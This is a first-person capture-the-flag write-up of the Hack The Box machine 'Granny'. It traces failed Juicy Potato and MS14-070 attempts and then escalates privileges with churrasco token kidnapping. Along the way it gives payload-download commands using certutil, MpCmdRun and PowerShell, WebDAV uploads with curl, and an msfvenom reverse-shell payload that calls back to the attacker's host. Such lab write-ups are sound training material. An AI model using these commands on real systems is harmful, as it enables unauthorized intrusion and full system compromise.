# Shell as Network Service

This was my second attempt at this box after a long break from retired boxes (and HTB in general).

I spent a bit of time fiddling around with Juicy Potato before I landed on the correct exploit, which you can [[15 - Shell as Network Service#Token Kidnapping|skip to]] if you like, as always.

## Trying Juicy Potato

I landed as a service user, which I know from recent research commonly has the `SeImpersonatePrivilege` privilege - sure enough:

![[Pasted image 20210611170617.png]]

From a bit of research on another box, I think this can be used to escalate privileges with Juicy Potato or a similar exploit.

A couple of articles were useful here:
- [Hacktricks](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens) for pointing to PoC implementations
- [Infinite Logins](https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/) for step by step exploit instructions
- [Foxglove](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)for a detailed explanation of how it works in theory

I downloaded `JuicyPotato.exe` from the [releases link](https://github.com/ohpe/juicy-potato/releases/tag/v0.1), and attempted to transfer it to the box using a python server:

```bash
┌──(mac㉿kali)-[~/Documents/exploits]
└─$ mv ~/Downloads/JuicyPotato.exe .
┌──(mac㉿kali)-[~/Documents/exploits]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

I tried a few methods of transferring the file:

- `wget 10.10.14.13:8000/JuicyPotato.exe`
- `powershell -command "Invoke-WebRequest -Uri http://10.10.14.13:8000/JuicyPotato.exe"`
- `powershell.exe -command "Invoke-WebRequest -Uri http://10.10.14.13:8000/JuicyPotato.exe"`
- `certutil.exe -urlcache -f "http://10.10.14.13:8000/JuicyPotato.exe" f.exe`
- `MpCmdRun.exe -DownloadFile -url "http://10.10.14.13:8000/JuicyPotato.exe" f.exe`

But none of them worked.

This was about where I got to on my first attempt, and I took a break. When I came back to the box a few weeks later, it clicked - I could just reuse WebDAV to upload:

```bash
┌──(mac㉿kali)-[~/Documents/exploits]
└─$ ls
JuicyPotato.exe
┌──(mac㉿kali)-[~/Documents/exploits]
└─$ curl -T JuicyPotato.exe http://10.10.10.15/jp.txt
```

I wasn't sure where exactly the file would land. I looked at previous windows boxes, e.g. [[Cereal Index|Cereal]], and they had been hosting IIS sites out of `C:\Inetpub`. So I checked there:

```cmd
C:\Inetpub>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Inetpub

04/12/2017  05:17 PM    <DIR>          .
04/12/2017  05:17 PM    <DIR>          ..
04/12/2017  05:16 PM    <DIR>          AdminScripts
06/11/2021  07:14 PM    <DIR>          wwwroot
               0 File(s)              0 bytes
               4 Dir(s)  18,125,492,224 bytes free

C:\Inetpub>cd wwwroot
cd wwwroot

C:\Inetpub\wwwroot>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Inetpub\wwwroot

06/11/2021  07:14 PM    <DIR>          .
06/11/2021  07:14 PM    <DIR>          ..
04/12/2017  05:17 PM    <DIR>          aspnet_client
02/21/2003  06:48 PM             1,433 iisstart.htm
04/12/2017  05:17 PM    <DIR>          images
06/11/2021  07:14 PM           347,648 jp.txt
06/11/2021  07:09 PM            38,649 msfasp.asp;.txt
02/21/2003  06:48 PM             2,806 pagerror.gif
04/12/2017  05:17 PM             2,440 postinfo.html
04/12/2017  05:17 PM    <DIR>          _private
04/12/2017  05:17 PM             1,754 _vti_inf.html
04/12/2017  05:17 PM    <DIR>          _vti_log
               6 File(s)        394,730 bytes
               6 Dir(s)  18,125,492,224 bytes free
```

Sure enough, there is `jp.txt`. Before I run it, the AdminScripts directory looked interesting:

```cmd
C:\Inetpub\wwwroot>cd ../AdminScripts
cd ../AdminScripts
Access is denied.
```

Access denied! Let's try to root the box instead then :)

I renamed the file to an `.exe`:

```cmd
C:\Inetpub\wwwroot>rename jp.txt jp.exe
rename jp.txt jp.exe
```

Running the script to see the options, I received the following error:

```cmd
C:\Inetpub\wwwroot>jp.exe
jp.exe
The image file C:\Inetpub\wwwroot\jp.exe is valid, but is for a machine type other than the current machine.
```

I figured this was an issue with the word size on the box. I ran `systeminfo` to check the architecture - it was x86, but on the [juicy potato github](https://github.com/ohpe/juicy-potato) there was no mention of what architecture to use and no separate release for certain word sizes.

### Switching to x86 Version

I googled "windows server 2003 juicy potato" to see if there was a specific version to use. I found [this article](https://ivanitlearning.wordpress.com/2019/07/20/potato-privilege-escalation-exploits-for-windows/), which I had actually skimmed previously when doing similar boxes but never read in full.

It confirmed my suspicions that the basic juicy potato does not work on x86 architectures:

![[Pasted image 20210611174318.png]]

Luckily, the author had written a version that does!

[https://github.com/ivanitlearning/Juicy-Potato-x86](https://github.com/ivanitlearning/Juicy-Potato-x86)

They also linked a good guide to using it to exploit: [https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato](https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato). I found a similar one here: [https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/](https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/)

I spent a bit of time trying to compile it from source, made harder than it needed to be by using Linux (I'm in dire need of a PC upgrade, which will be coming before I sit the exam). I eventually realised there was a [releases page](https://github.com/ivanitlearning/Juicy-Potato-x86/releases/tag/1.2) with a precompiled exe. Always check the releases folks!

I downloaded it and uploaded it to the box:

```bash
┌──(mac㉿kali)-[~/Documents/exploits]
└─$ cp ~/Downloads/Juicy.Potato.x86.exe .
┌──(mac㉿kali)-[~/Documents/exploits]
└─$ curl -T Juicy.Potato.x86.exe http://10.10.10.15/jp.txt
```

Deleted the old one and renamed the new:

```bash
C:\Inetpub\wwwroot>del jp.exe
del jp.exe

C:\Inetpub\wwwroot>rename jp.txt jp.exe
rename jp.txt jp.exe
```

Next, the exploit requires a CLSID. [This link](https://ohpe.it/juicy-potato/CLSID/) provides a script to get them, which I uploaded:

```bash
┌──(mac㉿kali)-[~/Documents/exploits]
└─$ cp ~/Downloads/GetCLSID.ps1 .
┌──(mac㉿kali)-[~/Documents/exploits]
└─$ curl -T GetCLSID.ps1 http://10.10.10.15/clsid.txt
```

Then renamed and attempted to execute:

```cmd
C:\Inetpub\wwwroot>rename clsid.txt clsid.ps1
rename clsid.txt clsid.ps1

C:\Inetpub\wwwroot>C:\Inetpub\wwwroot\clsid.ps1
C:\Inetpub\wwwroot\clsid.ps1

C:\Inetpub\wwwroot>powershell -noexit "& ""C:\Inetpub\wwwroot\clsid.ps1"""
powershell -noexit "& ""C:\Inetpub\wwwroot\clsid.ps1"""
'powershell' is not recognized as an internal or external command,
operable program or batch file.
```

However it didn't work. I tried just using the command provided on the off chance the CLSID worked:

```bash
C:\Inetpub\wwwroot>"jp.exe" -l 413 -p c:\windows\system32\cmd.exe -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
"jp.exe" -l 413 -p c:\windows\system32\cmd.exe -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
```

However it just hung. I didn't get anything on my netcat, and even tried running whoami in case the shell connected with no notice, but it didn't work:

![[Pasted image 20210611194007.png]]

I also tried the version from the [hunter2 writeup](https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato), but got a similar result:

```cmd
C:\Inetpub\wwwroot>jp.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
jp.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
```

There were a few CLSIDs listed on the ohpe page for different versions of Windows (suggesting they were in fact standardised and not like a PID) but none for Windows Server 2003. I thought about [manually extracting them](https://serverfault.com/questions/343148/how-do-i-find-application-name-using-guid-from-error-in-event-viewer-on-windows), perhaps by seeing what the powershell script did, but as this is one of the easiest boxes on HTB I figured there must be an... easier way.

## Windows Exploit Suggester

After a bit of a break, I looked at [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester).

### Setup

I cloned it into my `~/Documents/enum` directory:

```bash
┌──(mac㉿kali)-[~/Documents/enum]
└─$ git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
Cloning into 'Windows-Exploit-Suggester'...
remote: Enumerating objects: 120, done.
remote: Total 120 (delta 0), reused 0 (delta 0), pack-reused 120
Receiving objects: 100% (120/120), 169.26 KiB | 4.70 MiB/s, done.
Resolving deltas: 100% (72/72), done.
```

I then copied the `systeminfo` output from the box:

```bash
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            1 Days, 0 Hours, 7 Minutes, 22 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~1999 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 789 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,321 MB
Page File: In Use:         149 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```

I ran the update command to generate the database file:

```bash
┌──(mac㉿kali)-[~/Documents/enum/Windows-Exploit-Suggester]
└─$ python2 windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2021-05-07-mssb.xls
[*] done
```

I then tried installing `xlrd` and running the exploit:

```bash
┌──(mac㉿kali)-[~/Documents/enum/Windows-Exploit-Suggester]
└─$ python2 -m pip install xlrd
...[snip]...
┌──(mac㉿kali)-[~/Documents/enum/Windows-Exploit-Suggester]
└─$ python2 windows-exploit-suggester.py --database 2021-05-07-mssb.xls --systeminfo ~/Documents/HTB/granny/systeminfo 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
Traceback (most recent call last):
  File "windows-exploit-suggester.py", line 1639, in <module>
    main()
  File "windows-exploit-suggester.py", line 414, in main
    wb = xlrd.open_workbook(ARGS.database)
  File "/home/mac/.local/lib/python2.7/site-packages/xlrd/__init__.py", line 170, in open_workbook
    raise XLRDError(FILE_FORMAT_DESCRIPTIONS[file_format]+'; not supported')
xlrd.biffh.XLRDError: Excel xlsx file; not supported
```

However, it gave us an error saying that `.xlsx` files are not supported. I checked the exploit suggester issues and found [a solution](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/50) saying to install an earlier version of `xlrd`:

```bash
┌──(mac㉿kali)-[~/Documents/enum/Windows-Exploit-Suggester]
└─$ python2 -m pip install xlrd==1.2.0
...[snip]...
```

So now we can retry:

```bash
┌──(mac㉿kali)-[~/Documents/enum/Windows-Exploit-Suggester]
└─$ python2 windows-exploit-suggester.py --database 2021-05-07-mssb.xls --systeminfo ~/Documents/HTB/granny/systeminfo 
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 1 hotfix(es) against the 356 potential bulletins(s) with a database of 137 known exploits
[*] there are now 356 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2003 SP2 32-bit'
[*] 
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*] 
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
[*] 
[E] MS14-070: Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935) - Important
[*]   http://www.exploit-db.com/exploits/35936/ -- Microsoft Windows Server 2003 SP2 - Privilege Escalation, PoC
[*] 
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*] 
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-062: Vulnerability in Message Queuing Service Could Allow Elevation of Privilege (2993254) - Important
[*]   http://www.exploit-db.com/exploits/34112/ -- Microsoft Windows XP SP3 MQAC.sys - Arbitrary Write Privilege Escalation, PoC
[*]   http://www.exploit-db.com/exploits/34982/ -- Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation
[*] 
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
[*] 
[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
[*] 
[E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical
[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical
[*]   http://www.exploit-db.com/exploits/34458/
[*] 
[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
[*] 
[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
[E] MS14-002: Vulnerability in Windows Kernel Could Allow Elevation of Privilege (2914368) - Important
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
[M] MS13-071: Vulnerability in Windows Theme File Could Allow Remote Code Execution (2864063) - Important
[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical
[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical
[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical
[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[M] MS11-080: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2592799) - Important
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[M] MS09-065: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (969947) - Critical
[M] MS09-053: Vulnerabilities in FTP Service for Internet Information Services Could Allow Remote Code Execution (975254) - Important
[M] MS09-020: Vulnerabilities in Internet Information Services (IIS) Could Allow Elevation of Privilege (970483) - Important
[M] MS09-004: Vulnerability in Microsoft SQL Server Could Allow Remote Code Execution (959420) - Important
[M] MS09-002: Cumulative Security Update for Internet Explorer (961260) (961260) - Critical
[M] MS09-001: Vulnerabilities in SMB Could Allow Remote Code Execution (958687) - Critical
[M] MS08-078: Security Update for Internet Explorer (960714) - Critical
[*] done
```

There were *loads* of exploits. I tried looking for a `critical` one that referenced Windows Server 2003.

I looked at a few pages:
- `https://www.exploit-db.com/exploits/37098/` - this was a `.cpp` file for MS15-010 - I skipped it as I wasn't sure how to upload or compile it at first
- `https://www.exploit-db.com/exploits/35474` - a python exploit for MS14-068, but python is not installed on the box so I skipped it
- `https://www.exploit-db.com/exploits/35936` - another python exploit, this time for MS14-070
- `https://www.exploit-db.com/exploits/37367` - a metasploit module for MS15-051
- `https://www.exploit-db.com/exploits/35101` - another metasploit module for MS14-058

I spent a while here searching for a working one that was precompiled and didn't use metasploit. This took longer than it should have done - partly because, for some reason, Windows Exploit Suggester didn't suggest a very useful file that would have let me root the box straight away...

## Trying MS14-070

This exploit looked promising before, but didn't have any exploits in a language I could use (at least on exploit DB). There were a couple of options, like this [python one](https://www.exploit-db.com/exploits/35936), but as far as I could tell it couldn't be used remotely and the box didn't have python installed.

So I searched "ms14-070 exe" and tried to find some `.exe` files. This one came up straight away: [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070/MS14-070](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070/MS14-070)

I uploaded it and tried to execute it:

```cmd
C:\Inetpub\wwwroot>rename ms14070.txt ms14070.exe
rename ms14070.txt ms14070.exe

C:\Inetpub\wwwroot>c:\inetpub\wwwroot\ms14070.exe
c:\inetpub\wwwroot\ms14070.exe
```

I tried the second exploit in the repo too, but neither worked.

I'm not sure why Windows Exploit Suggester failed me here - on other writeups, such as [Rana Khalil's](https://ranakhalil101.medium.com/hack-the-box-granny-writeup-w-o-and-w-metasploit-f7a1c11363bb), the correct exe was suggested straight away. But I spent a lot of time fumbling around before I did.

## Token Kidnapping

I ran out of ideas for exploiting MS14-070 so just searched for windows server 2003 privilege escalation:

![[Pasted image 20210611234551.png]]

This gave us this exploitdb script: [https://www.exploit-db.com/exploits/6705](https://www.exploit-db.com/exploits/6705)

Which references churrasco:

![[Pasted image 20210611235015.png]]

An `.exe` can be found here: [https://github.com/Re4son/Churrasco/blob/master/churrasco.exe](https://github.com/Re4son/Churrasco/blob/master/churrasco.exe)

I downloaded this, and uploaded it to Granny:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ mv ~/Downloads/churrasco.exe .
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ curl -T churrasco.exe http://10.10.10.15/churrasco.txt
```

I couldn't get the syntax working for directly reading a flag:

```bash
C:\Inetpub\wwwroot>churrasco.exe "type 'C:\Documents and Settings\Lakis\Desktop\user.txt'"
churrasco.exe "type 'C:\Documents and Settings\Lakis\Desktop\user.txt'"
The filename, directory name, or volume label syntax is incorrect.

C:\Inetpub\wwwroot>churrasco.exe "type 'C:\Documents and Settings\Administrator\Desktop\root.txt'"
churrasco.exe "type 'C:\Documents and Settings\Administrator\Desktop\root.txt'"
The filename, directory name, or volume label syntax is incorrect.

C:\Inetpub\wwwroot>churrasco.exe 'type "C:\Documents and Settings\Lakis\Desktop\user.txt"'
churrasco.exe 'type "C:\Documents and Settings\Lakis\Desktop\user.txt"'
''type' is not recognized as an internal or external command,
operable program or batch file.

C:\Inetpub\wwwroot>churrasco.exe "type C:\Documents\ and\ Settings\Lakis\Desktop\user.txt"
churrasco.exe "type C:\Documents\ and\ Settings\Lakis\Desktop\user.txt"
The system cannot find the path specified.

C:\Inetpub\wwwroot>churrasco.exe "type C:/Documents\ and\ Settings/Lakis/Desktop/user.txt"
churrasco.exe "type C:/Documents\ and\ Settings/Lakis/Desktop/user.txt"
The syntax of the command is incorrect.
```

So I used a reverse shell isntead:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=9002 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: rev.exe
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ curl -T rev.exe http://10.10.10.15/rev.txt
```

I executed it with `churrasco.exe`:

```bash
C:\Inetpub\wwwroot>rename rev.txt rev.exe
rename rev.txt rev.exe

C:\Inetpub\wwwroot>churrasco.exe "C:\inetpub\wwwroot\rev.exe"
churrasco.exe "C:\inetpub\wwwroot\rev.exe"
```

And got a shell!

![[Pasted image 20210612000915.png]]

That's the box!

![[Pasted image 20210612001312.png]]